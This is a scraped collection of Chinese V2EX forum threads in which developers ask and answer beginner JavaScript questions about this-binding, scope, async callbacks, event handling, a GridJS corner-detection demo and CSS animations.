{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://js.org/\">http://js.org/</a> 在为 GitHub pages 上的 JavaScript project 提供免费的二级域名，<code>user pages</code> 也可以申请 。<br>\n今天刚申请了一个 <a target=\"_blank\" rel=\"nofollow\" href=\"http://7anshuai.js.org\">http://7anshuai.js.org</a> 指向 7anshuai.github.io，有需要的可以试试。</p>\n\n<p>PS: GitHub pages 好像不支持两个 custom domains!</p>\n</div></div>"], "reply": "目前尚无回", "tittle": ": Get a nice and free domain for your GitHub pages", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天突然想到用个变量去指向console.log于是：<br>\nvar log = console.log;<br>\nlog(1);</p>\n\n<p>但是出现了如下错误：<br>\nUncaught TypeError: Illegal invocation</p>\n\n<p>是浏览器的内置console.log不能手动的指向她？</p>\n</div></div>"], "reply": "16", "tittle": "JS 中 console.log 的问题。", "comment": ["顺手答，不谢： ", "\r", "\r", "当然，你也可以简单的定义window.console  = window.console || {log:function(){...}, ...}", " 可是这样子干的话。。console出来的line number是自定义的log函数的地方而不是使用log函数的地方。。。看起来有点累。", "这样也好：\r", "var log = function(msg) { console.log(msg); }", " 而且window.console = window.console这是在干嘛...", " 一开始我是这么干的...但是console出来的代码line number是定义这个log函数的line number而不是调用log函数的地方，看console信息非常难受，不能第一时间看到出错的地方", "貌似有解： ", "```\r", "var log = console.log.bind(console)\r", "log(123)\r", "```\r", "\r", "这样就好了呀", " 正解啊，像我那样调用的话scope是window而不是console了。", " 不是scope而是this...，多谢了。", " XD，看7L的解决办法，一个字6。", " 我自己之前封装log的时候，还需要加一些其他业务逻辑，不方便之处就是行号显示不对。这样的话貌似只是改了个名字~", "log = console.log\r", "\r", "然后调用不对,可能内部实现,是依赖this值的,log单独调用时this指向不对...\r", "\r", "在node上就没有这个问题,console.log.toString() 显示的是native code", " 对啊，要用lineNumber的话必须是Error，但我只是想log一下而已..", " 对的，内部的this本来是指向console的，我直接在全局调用的话，this就是window了，所以出错了。", "同样的\r", "var g = document.getElementById;\r", "g('foo');\r", "也是不行的", " this 还是 console，因为 bind 了"]},
{"content": ["<div class=\"topic_content\">脚本地址 <a target=\"_blank\" href=\"http://g.tbcdn.cn//mtb/app-weapp/0.9.28/assets/js/caniuse.js\" rel=\"nofollow\">http://g.tbcdn.cn//mtb/app-weapp/0.9.28/assets/js/caniuse.js</a><br><br><br>教教我好吗<br>页面 <a target=\"_blank\" href=\"http://wuxian.taobao.com/\" rel=\"nofollow\">http://wuxian.taobao.com/</a><br><br>版本 44.0.2383.0 dev-m，还是会被跳转</div>"], "reply": "14", "tittle": "不想用 uc 或者别的壳，怎么才不会被跳转", "comment": ["有救吗TAT", " 楼主要表达什么…", "用firefox", "淘宝的无线平台是推荐用chrome的把", " 这个页面有脚本判断，然后我的版本是44会被跳转到下载浏览器页面（chrome/或uc）\r", "可是我已用的chrome\r", " 非chromium不行\r", " 我用的是dev版可能版本太高了", " 看那个 javascript 的第一行：\r", "userAgent.match(/chrome\\/(\\d+)/i);e?(o=e[1],console.log(\"Chrome version\",o)):console.log(\"NOT Chrome core\")\r", "楼主打开 chrome 的 console 看看输出了什么，然后可以试试 user-agent 切换插件~", " 我去试试看 谢谢 ua已经尝试过", " 更暴力的方法，直接把这个脚本的 url 直接屏蔽掉（路由层面？或者系统层面？）", " ", "  \r", "看不懂，好羡慕能看懂的人", " 我看了一下我的普通版 chrome，ua 应该是：Chrome/42.0.2311.135\r", "你的应该是中间多了个 version，所以被跳转了，你用 ua 模拟插件，模拟一下我这个 ua 试试看？", " 我的版本号是44 ua是User-Agent:Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2383.0 Safari/537.36\r", " 红色部分应该是不支持的属性 web components google了一下好像是新的前端组件\r", "但是新技术没可能42支持的，44会不支持啊", " \r", "呃，刚刚看错了，你的 log 中那个 chrome version 42 是脚本输出的，而非你的 ua，汗…\r", "再自己看了一下你的 log，应该是那个 has import false，导致被重定向的，再看看脚本：\r", "\r", "r=document.createElement(\"link\");\r", "r.rel=\"import\";\r", "var n=r.hasOwnProperty(\"import\");\r", "console.log(\"has import\",n)\r", "\r", "……貌似只从无线平台的首页已经分析不下去了", " 谢谢啦 无论如何 ，如果你有C店的话可以试试看，不是这个页面，是里面有个链接（装修页面）", "String.prototype.match = function() { return true}\r", "\r", "把方法都改了。。。全部返回true"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var testArr = function(){</p>\n<div class=\"highlight\"><pre>this.imgRandArr = [1,2,3];\n</pre></div>\n\n<p>}</p>\n\n<p>testArr.prototype = {</p>\n<div class=\"highlight\"><pre>startFunc:function(){\n    var self = this;\n    self.changeArr();\n    console.log(self.imgRandArr)  //这个先执行\n\n},\n\nchangeArr:function(){\n    var self = this;\n    self.imgRandArr[0] = 999;\n    console.log(self.imgRandArr)  //这个后执行\n}\n</pre></div>\n\n<p>}</p>\n\n<p>这段代码在控制台是先输出1,2,3，在输出999,2,3</p>\n</div></div>"], "reply": "1", "tittle": "不明白为什么输出顺序是这样子", "comment": ["如果你执行的是\r", "\r", "```javascript\r", "var t = new testArr();\r", "t.startFunc()\r", "```\r", "那输出一点问题没有. 都是999,2,3"]},
{"content": "", "reply": "目前尚无回", "tittle": "小白这几天再赶数据库 PJ 请问 express hbs 要怎么让某个页面不用模板？ 感激不尽！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://ww2.sinaimg.cn/bmiddle/69dd3998gw1erwz95y95nj209i099dho.jpg\">http://ww2.sinaimg.cn/bmiddle/69dd3998gw1erwz95y95nj209i099dho.jpg</a></p>\n\n<p>就是当某一行/某一列全部都是正确图案的时候，这一行/列的边框就会闪烁，有什么好的实现方案？</p>\n</div></div>"], "reply": "8", "tittle": "如何实现这种拼图的边框闪烁效果？", "comment": [" \r", "补充一下，像这样，不是每个格子都闪烁", "控制border-bottom和border-top加class，然后第0个和第3个元素分别加border-left和border-right的class。class效果就写成z-index: 99999; shadow: xxx;这样 =。=？", " 这些碎片的位置数组是随机的每次，这样子行不通吧", "改需求，变成内容变亮就可以了。\r", "你只高亮边框的话还有一个不规则边缘的判断问题，比如井字形正确时，边框如何显示？", "就是拼图嘛。我说下如果我来做的方式。\r", "每个图片有个随机标识，每移动一次后，延迟一段时间把图片标识序列发送到后端校验一下。如果校验存在正确的情况，返回正确的标识和序列对应关系，然后前端脚本做分析并高亮处理；如果没有正确的情况，204。\r", "实现的重点在随机标识以及移动后正确标识的识别，前端脚本的分析与高亮。", " 但是用户移动以后的位置是可以获取的呀，有了这个位置信息就可以判断顺序了~", " 恩，我也觉得这个需求吃力不讨好", "普通拼图 z-index:1\r", "亮色边框 z-index:2\r", "正确拼图 z-index:3\r", "亮色边框在不正确的时候设置opacity 0"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var spider = spider || {};</p>\n\n<p>(function (JOINSSE){<br>\n    //TODO a b here</p>\n<div class=\"highlight\"><pre>spider.mainLogView = mainLogView;\n</pre></div>\n\n<p>})(spider);</p>\n</div></div>"], "reply": "15", "tittle": "这种是什么写法，为什么能避免变量名冲突？", "comment": ["闭包。\r", "变量作用域的问题。", "IFEE, 参看这个：\r", "我怎么感觉这代码还是有问题……\r", "\r", "传入的参数名叫 JOINSSE，\r", "但是里面引用的变量名是 spider，那么在函数里面找不到，往外找，最后还是会找到外面的某个 spider 而不是传入作为参数的那个 spider。", " 第一行不是定义spider了吗", " 参数白传了..", " 白传了是什么概念。。。", " 在闭包外部，spider 以引用的形式传入闭包，这个引用名是 JOINSSE，你可以直接使用 spider，js 的作用域会向外查找，但 JOINSSE 就白传了", " 0 ，0 原来是这个意思。。。  我好像刚刚脑袋里自动纠正了这个。。", "js里只有两用作用域：一是全局作用域，即Global。二是由function定义的局部作用域，或者叫块级作用域，也可以理解为私有作用域。", " \r", " \r", "不是白传的，我没写出来而已", " 呃。。。那为什么还要直接操作 spider 对象？", "  我也不清楚，因为没接触过这种写法，但是项目里每个文件都是这个模板，每个里面都有传一个类似JOINSSE的参数，外面的spider全部是固定的", " 这不是闭包\r", "\r", " “立即执行函数表达式”叫IIFE，不叫IFEE\r", "\r", " JS里不存在块级作用域，只有全局作用域与函数作用域两种，块级作用域与函数作用域是两种不同的概念", "  这就是错的，唯一有用的就是第一句", "第一行是定义全局变量，这个spider若存在，则还是它，否则是一个空对象。\r", "\r", "后面是一个立即执行的匿名函数，传入了一个spider的参数…变量名冲突是什么意思，没明白楼主想知道什么。。。我是半吊子"]},
{"content": ["<div class=\"topic_content\">具体效果是这样的:我想把主页做成左边一半白色，右边一半黑色！左边有个用户输入框，右边一个密码输入框！输入用户名，密码！点击登录，半边白色和黑色都渐渐退出，让访客看到首页内容！</div>"], "reply": "12", "tittle": "各位大侠，有什么方法实现\"拉窗帘\"或者说\"推门\"效果……", "comment": ["AJAX", "js动画", "我写个给你看看：\r", "用jquery的slide方法，或者animation方法", " 我只能膜拜，谢谢", " 谢谢，我淡入淡出效果不是我想要的", "谢谢诸位！菜鸟学这个真是伤脑筋", "为什么发在了 PHP 节点呢？你说拉窗帘，那么一定是在说这个了\r", "\r", "\r", " 你的html 和css被我抄袭了", "  啊噗。。就是这个。你自己看卖葱给你实例就知道了 fadeOut fadeIn", "$(function(){\r", "       $(\".btn\").on('click',function() {\r", "    \t\t  $(\".left-door\").animate({left:'-1000px'},1000);\r", "          $(\".right-door\").animate({right:'-1000px'},1000);\r", "          $(\".page-content\").show();\r", "       })\r", "    });\r", "\r", " 照着楼上的，我用animate写了一个", " "]},
{"content": ["<div class=\"topic_content\">正在写一个JS的图像库，然后我希望设计一个图像对象，在这个图像库中的所有方法都属于这个图像对象，并且执行后返回的还是图像对象，这样我就可以这样写代码了：\r<br>\r<br>imageObject.resize(200, 200).rotate(45).resize(100, 100).grayscale().rotate(90);\r<br>\r<br>所以在写函数的时候就很自然地写了：\r<br>\r<br>var imageObject = this;\r<br>\r<br>然后JSHint就给出了这个警告。\r<br>\r<br>我知道可以通过配置文件让JSHint忽略这个警告，但我也深知不在少数的同学对JS的this认识得并不深入，如果忽略这个警告，以后和小伙伴们一起玩耍难免会有小伙伴不小心搞错了this。\r<br>\r<br>所以我的问题是：可否有一个两全的方法来实现我的想法。</div>"], "reply": "3", "tittle": "Possible strict violation.", "comment": ["没有完全搞懂你的意思，但是这种流式 API 是非常常见的，你可以看一下别人的代码，比如这个比较常用的处理图像的库 ", " 就是这种流式 API", " 啊，我知道怎么做了，谢谢你~", "function ImageObj(img){\r", "this.img=img;\r", "}\r", "ImageObj.prototype.func1 = function(){\r", "//do something to this.img\r", "return this;\r", "}\r", "var imgObj = new ImageObj(img)"]},
{"content": ["<div class=\"topic_content\">现在得到的返回是\r<br>$.each(entries, function(idx, entry) {\r<br>  console.log(entry);\r<br>});\r<br>\r<br>key\r<br>value\r<br>john\r<br>JOHN\r<br>doe\r<br>DOE\r<br>foo\r<br>FOO\r<br>bar\r<br>BAR\r<br>\r<br>最终的输入是：[{\"key\": \"john\", \"value\": \"JOHN\"}, {\"key\": \"doe\", \"value\": \"DOE\"}, {\"key\": \"foo\", \"value\": \"FOO\"}, {\"key\": \"bar\", \"value\": \"BAR\"}]\r<br>\r<br>发现自己连这都做不出来，太受打击了...</div>"], "reply": "11", "tittle": "感觉自己弱爆了，如何将这货转换为目标格式啊", "comment": ["json_array", "没看懂", "期望输出是？", "期待输出的是key：value？", "先去找提问的智慧看看。\r", "然后，如果我没理解错的话，你有一个 array ，如下：\r", "```\r", "var arr = ['key','value','john','JOHN','doe','DOE','foo','FOO','bar','BAR'];\r", "```\r", "你希望输出如下的 array：\r", "```\r", "[{\"key\": \"john\", \"value\": \"JOHN\"}, {\"key\": \"doe\", \"value\": \"DOE\"}, {\"key\": \"foo\", \"value\": \"FOO\"}, {\"key\": \"bar\", \"value\": \"BAR\"}] \r", "```\r", "\r", "如果上述无误，你可以这样做：\r", "```\r", "var k1 = arr[0], k2 = arr[1], result = [];\r", "for (var i = 2; i < arr.length; i+=2) {\r", "    var obj = {};\r", "    obj[k1] = arr[i];\r", "    obj[k2] = arr[i+1];\r", "    result.push(obj);\r", "}\r", "```", "脱离 jQuery ，最容易的思路大概是：\r", "首先拿到前两个字符串作为元素的键；\r", "然后用一个步进为 2 的 for 循环生成剩下的内容。", "_(:з」∠)_比 5 楼慢了几秒钟…", " 太感谢了！下一次我一定从提好问题开始！学习了！", " 再说一次感谢！可惜不能多发送几次感谢", "v2ex不支持markdown确实很蛋疼", " +1 对于不支持markdown也是表示不可理解。\r", "\r", "回复的时候没有楼层显示，也让我找回复的时候多花费了很多时间。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>造这个轮子的原因是当时想做一个Mac桌面端的图片拖拽上传，无奈7牛的uptoken需要服务器端来生成，7牛又没有生成token的Mac SDK,所以就索性用原生js搭了一个轮子。</p>\n\n<p>直接引用js文件就能生成uptoken,不用请求服务器端,省去了请求服务器端的延迟(虽然也没啥延迟),也省去了还专门搭一个服务器端的过程</p>\n\n<p>文件压缩后只有6kb 很小巧</p>\n\n<p>repo在下面 求star ^_^<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/w88975/qiniu-uptoken\">https://github.com/w88975/qiniu-uptoken</a></p>\n</div></div>"], "reply": "4", "tittle": "用原生 js 写了一个生成 7 牛的 token 的轮子", "comment": ["把secret_key曝露在客户端真的好吗", "蛋疼 看着有还有优化余地就优化了个\r", "   看你应用的场景了，我做的是本地应用，所以就不想用到服务器端生成token，退一万步说，7牛的sk也不是什么至关重要的东西，仅仅是用于上传罢了", "从服务器绕一圈就是为了安全，即便只能上传，就不怕空间炸掉么"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天为大家带来的Demo不仅仅是图像滤镜处理，让我们来点和计算机视觉有关的，这也是我写GridJS的最初目的。</p>\n\n<p>还不知道<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gridjs/gridjs\">GridJS</a>是什么的小伙伴们请看这里：<a target=\"_blank\" rel=\"nofollow\" href=\"http://v2ex.com/t/191612\">http://v2ex.com/t/191612</a></p>\n\n<p>原图：</p>\n\n<p><img src=\"http://ww4.sinaimg.cn/large/71ec0c97jw1es9big3j12j20dw09ydgb.jpg\" alt=\"\"></p>\n\n<p>检测角点结果（下面的图需要大家仔细看看，红点不是很明显，因为我偷懒只标了一个像素的尺寸）：</p>\n\n<p><img src=\"http://ww4.sinaimg.cn/large/71ec0c97jw1es9bbrt9xaj20dw09ydgb.jpg\" alt=\"\"></p>\n\n<p>代码：</p>\n<div class=\"highlight\"><pre>var canvas = document.getElementById('workplace');\n\ngridjs.open('cube.jpg', function(im) {\n  var H, corners, i;\n\n  im.grayscale();\n  H = harris(im.pixel.G);\n  corners = getHarrisPoint(H, 0.015, 10);\n  im.rgba();\n\n  for (i = 0; i &lt; corners.length; i++) {\n    im.pixel.r[corners[i].y][corners[i].x] = 255;\n    im.pixel.g[corners[i].y][corners[i].x] = 0;\n    im.pixel.b[corners[i].y][corners[i].x] = 0;\n  }\n\n  im.update().show(canvas);\n});\n\nfunction harris(srcArray) {\n  var imx, imy, wxx, wyy, wxy, wdet, wtr, H,\n      g = gridjs;\n\n      imx = g.gauss(srcArray, 5, 1, 0);\n      imy = g.gauss(srcArray, 5, 1, 1);\n\n      wxx = g.gauss(g.square(imx), 5);\n      wyy = g.gauss(g.square(imy), 5);\n      wxy = g.gauss(g.mul(imx, imy), 5);\n\n      wdet = g.minus(g.mul(wxx, wyy), g.square(wxy));\n      wtr = g.add(wxx, wyy);\n\n      H = g.div(wdet, wtr, 0);\n\n      g.norm(H);\n\n      return H;\n}\n\nfunction getHarrisPoint(harrisArray, threshold, minDistance) {\n  var x, y, i, j, distance2,\n      minDistance2 = minDistance * minDistance,\n      index = 0,\n      width = harrisArray[0].length,\n      height = harrisArray.length,\n      points = [];\n\n  for (y = 0; y &lt; height; y++) {\n    for (x = 0; x &lt; width; x++) {\n      if (harrisArray[y][x] &gt;= threshold) {\n        points[index++] = {\n          'x' : x,\n          'y' : y,\n          'h' : harrisArray[y][x]\n        }\n      }\n    }\n  }\n\n  points.sort(function(a, b) {\n    return b.h - a.h;\n  });\n\n  for (i = 0; i &lt; points.length; i++) {\n    for (j = 0; j &lt; i; j++) {\n      distance2 = (points[i].x - points[j].x) * (points[i].x - points[j].x) +\n                  (points[i].y - points[j].y) * (points[i].y - points[j].y);\n\n      if (distance2 &lt; minDistance2) {\n        points.splice(i, 1);\n        i--;\n        break;\n      }\n    }\n  }\n\n  return points;\n}\n</pre></div>\n</div></div>"], "reply": "2", "tittle": "使用 GridJS 检测图像角点", "comment": ["Cool", "点赞~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对es6 中的promise 有兴趣。</p>\n\n<p>这个是js用的吗？<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/kriskowal/q\">https://github.com/kriskowal/q</a></p>\n</div></div>"], "reply": "18", "tittle": "现在 js 有异步流程控制的库嘛？", "comment": ["promise和流程控制没啥关系。\r", "\r", "流程控制，你需要async.js", "promise 有点像改变了回调的写法，并不是流程控制。", "楼主举个例子？", " @", "  promise 处理异步吧。好咯，我标题起得不好～\r", "\r", "  就是关于如果处理多个 异步时要等待全部 异步完成返回结果再继续下一步操作。", "async的 parallel\r", "符合你的要求", "when.js ", "async function myFunction() {\r", "    let result = await somethingThatReturnsAPromise();\r", "    console.log(result); // cool, we have a result\r", "}\r", "\r", "这是 ES7 支持的 async function，ES6 可以用 generator function 完成类似的事情，例如 promise 结合 Q，可以这么玩：\r", "\r", "var all = Q.async(function* () {\r", "    var src = yield getData();\r", "    var img = yield getImg(src);\r", "    showImg(img);\r", "});", "这是我的几篇博客，与你的问题有些关联：\r", "\r", "\r", "\r", "只要 Promise 相关的都可以", "献上我写的库给各位大神, 符合promise/A+标准, 仅200行代码!\r", "\r", "这里有本 promise book，看完你就懂了", "bluebird", "嗯，async & co是流程控制库，都支持promise的", "\r", "这个？", "co + thunkify", "bluebird", "  ", " 这个用在node.js里的？", " Node 和 浏览器，都可以用。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>怎么让 ajax 请求返回：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"kr\">class</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">method</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">q</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"p\">;</span>\n    <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"s1\">'api/get'</span><span class=\"p\">,</span> <span class=\"nx\">q</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"c1\">// 这里的 return 貌似只返回到了 method</span>\n      <span class=\"k\">return</span> <span class=\"nx\">data</span><span class=\"p\">;</span>\n    <span class=\"p\">});</span>\n    <span class=\"c1\">// 这里的 return 没有得到赋值。。。</span>\n    <span class=\"k\">return</span> <span class=\"nx\">data</span><span class=\"p\">;</span>\n  <span class=\"p\">},</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// return null...</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"kr\">class</span><span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">({</span><span class=\"nx\">q</span><span class=\"o\">:</span><span class=\"s1\">'q'</span><span class=\"p\">}));</span>\n</pre></div>\n</div></div>"], "reply": "8", "tittle": "js 变量作用域", "comment": ["“var data = null;” 去掉“var”试试？", "-method:function(q){\r", "+method:function(q,callback){\r", "\r", "-$.get('api/get', q, function(data) {});\r", "+$.get('api/get', q, callback);\r", "\r", "class.method({q:'q'},function(data){\r", "console.log(data)\r", "})", "这个跟作用域没关系\r", "method中调用$.get，将一个匿名函数传递给$.get，此时该函数并未被执行，而是继续走到了return data 此时函数class.method返回null。\r", "当ajax获取数据后，之前传递给$.get的函数才会被调用，但此时已与之前的class.method函数调用没有关系了。\r", "如果想得到ajax返回的数据，只能依次使用回调。\r", "\r", "比如这样:\r", "var class = {\r", "  method: function(q, fn) {\r", "    //var data = null;\r", "    $.get('api/get', q, function(data) {\r", "      fn(data);\r", "    });\r", "    //return data;\r", "  },\r", "};\r", "\r", "class.method({q:'q'}, function(data){ console.log(data); });", "这里牵涉到一个异步和一个作用域的问题。\r", "如果对异步不熟悉的话，可以考虑看下async库。\r", "另外，jquery中的ajax现在应该本身也有类似promise的实现。", "jQuery可以考虑下deferred对象：\r", "function method(q) {\r", "    var dfd = $.Deferred();\r", "    $.get('api/get', q).done(function (data) {\r", "        dfd.resolve(data);\r", "    }).fail(function () {\r", "        dfd.reject();\r", "    });\r", "    return dfd.promise();\r", "}\r", "\r", "method.done(function(data){ console.log(data); })", "恭喜解锁成就，入了回调的坑。", "$.get('api/get', q, function(data) {\r", "      // 这里的 return 貌似只返回到了 method\r", "      return data;\r", "    });\r", "    return data;\r", "\r", "你从代码执行的角度看，function (data) {...} 其实只是传进$.get()的一个参数而已，执行完$.get()后，自然就return data了，至于你传进去的function (data) {...} （又称回调函数）在什么时候执行，取决于你的接口什么时候返回数据。", "恭喜入异步的坑，不过能意识到这点走到这一步，表示离光明不远了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以下情况 js 是传复制值还是引用：</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// 类</span>\n<span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"kd\">var</span> <span class=\"kr\">class</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n\n    <span class=\"nx\">init</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">arg</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"c1\">//...</span>\n    <span class=\"p\">},</span>\n\n    <span class=\"nx\">method</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"c1\">//...</span>\n    <span class=\"p\">},</span>\n\n    <span class=\"nx\">set</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">value</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"c1\">//...</span>\n    <span class=\"p\">},</span>\n\n  <span class=\"p\">};</span>\n  <span class=\"k\">return</span> <span class=\"kr\">class</span><span class=\"p\">;</span>\n\n<span class=\"p\">});</span>\n\n<span class=\"c1\">// 声明</span>\n<span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"kd\">var</span> <span class=\"k\">new</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n\n    <span class=\"nx\">init</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">obj</span> <span class=\"o\">=</span> <span class=\"kr\">class</span><span class=\"p\">;</span>\n      <span class=\"c1\">// 重复一次 obj class</span>\n      <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">set</span> <span class=\"o\">=</span> <span class=\"kr\">class</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">;</span>\n    <span class=\"p\">},</span>\n\n  <span class=\"p\">};</span>\n  <span class=\"k\">new</span><span class=\"p\">.</span><span class=\"nx\">init</span><span class=\"p\">();</span>\n\n<span class=\"p\">})();</span>\n\n<span class=\"c1\">// 调用</span>\n<span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n\n  <span class=\"kd\">var</span> <span class=\"nx\">other</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n\n    <span class=\"nx\">init</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"nx\">obj</span><span class=\"p\">.</span><span class=\"nx\">init</span><span class=\"p\">(</span><span class=\"s1\">'argv'</span><span class=\"p\">);</span>\n      <span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'value'</span><span class=\"p\">);</span>\n    <span class=\"p\">},</span>\n\n  <span class=\"p\">};</span>\n  <span class=\"k\">return</span> <span class=\"nx\">other</span><span class=\"p\">;</span>\n\n<span class=\"p\">});</span>\n</pre></div>\n\n<p>像这样，1个 class 声明为2个 window，是传复制值呢，还是传的引用呢？内存占用各方面是一样的吗？</p>\n</div></div>"], "reply": "10", "tittle": "js 传值 传引用 和 window", "comment": ["均是引用", "……保留字都用了你这代码能运行？", "首先对奇葩的代码我就不吐槽了，下面说重点：\r", "\r", "1：class是保留字，是不能用做变量名和函数名的；\r", "2：window.obj = class和window.set = class.set;只是把window的obj属性以及set属性分别指向class对象以及class对象的set方法。而且说什么1个 class 声明为2个 window真是乱说一气。\r", "3：你声明的class是一个字面量对象，是引用类型，所以赋值是传的引用。", " 如果是这样的话，我是不是可以把很多类都声明成 window 属性？可以减少在不同的类里边重复声明？同时也解决作用域的问题？", "先看本书再问吧", "class是关键字就不说了\r", "\r", "声明里面：\r", "```\r", "    init: function() {\r", "      window.obj = class;\r", "      // 重复一次 obj class\r", "      window.set = class.set;\r", "    },\r", "```\r", "\r", "这里是想把class挂到window上吗？假设class不是关键字，这里也会抛出’class' is undefined的异常；\r", "\r", "然后调用里面：\r", "```\r", "    init: function() {\r", "      obj.init('argv');\r", "      set('value');\r", "    },\r", "```\r", "set的context变成window了。（话说这么污染window真的没问题？）", "你需要了解闭包中变量的作用域", "LZ 是从其它英语方向转来的吧，声明变量都这么易懂==", " 先看本书再说吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>rt 是否应该给每一个方法都加上 return false...</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"kr\">class</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">method</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">arg</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">arg</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">return</span> <span class=\"nx\">arg</span><span class=\"p\">.</span><span class=\"nx\">argv</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n  <span class=\"p\">},</span>\n\n  <span class=\"nx\">get</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 此次省略一堆...</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n  <span class=\"p\">},</span>\n\n  <span class=\"nx\">set</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// 此次省略一堆...</span>\n    <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n  <span class=\"p\">},</span>\n<span class=\"p\">};</span>\n\n<span class=\"kr\">class</span><span class=\"p\">.</span><span class=\"nx\">method</span><span class=\"p\">(</span><span class=\"s1\">'argc argv'</span><span class=\"p\">);</span>\n</pre></div>\n</div></div>"], "reply": "16", "tittle": "应该给每一个方法都加上 return false 吗？", "comment": ["不应该，如果你真要退出一个无返回值的方法，就用return ;", " 那应该不写 return 吗？如果是执行一个事件的话？", "为什么要加，有什么含义？", "不需要的话，return 都不用写啊。你强行加个 return false 木有任何意义。", " 比如执行 class.set 他执行完自动 return 了 undefined 。。。\r", "\r", "听说加 return false 可以阻止冒泡什么的\r", "\r", "大家一般都是怎么做的呢？", "undefined !== false", " undefined 有o(n)种可能啊", " ……你这些方法跟事件 handler 有什么关系。要阻止 dom 事件冒泡也是根据需求啊，又不是随便一个 handler 都需要阻止冒泡，你随便阻止冒泡弄出一大堆别人调试都很难发现的 bug 那时候才蛋疼。\r", "\r", "你的API 在定义的时候，如果是没有返回值的，那你管函数默认返回什么呢？undefined 也好你自己强行返回了个 false 也好，有什么意义呢？如果你的 API 定义就是要有返回值的，那就按照约定做返回啊。", "return alert(\"出错了！\")", " \r", "\r", "你是指网页写js的时候可以通过return false来阻止默认时间的执行？", " 阻止冒泡不推荐用return false了\r", "应该用e.stopPropagation() \r", "阻止默认行为用e.preventDefault()\r", " 阻止冒泡并且阻止其他handler继续用 e.stopImmediatePropagation()\r", "\r", "return false 相当于 e.stopPropagation() + e.preventDefault()\r", "不过还是用这些方法比较好 一个是可以在最前面阻止 避免出错导致return false没有执行\r", "而且控制也更加明确 可以不return继续执行下面的代码\r", "\r", "有些custom API需要event handler return false阻止执行 那么就按照API的定义使用就是", "我想知道，你返回一个false是什么意思？", "楼主强迫症", "没有返回的方法，个人比较推荐加 return this", "弱弱的问下,这写法具体叫做什么\r", "var class = {\r", "  method: function(arg) {\r", "  },\r", "  get: function() {\r", "  },\r", "  set: function() {\r", "  },\r", "};", " 封装"]},
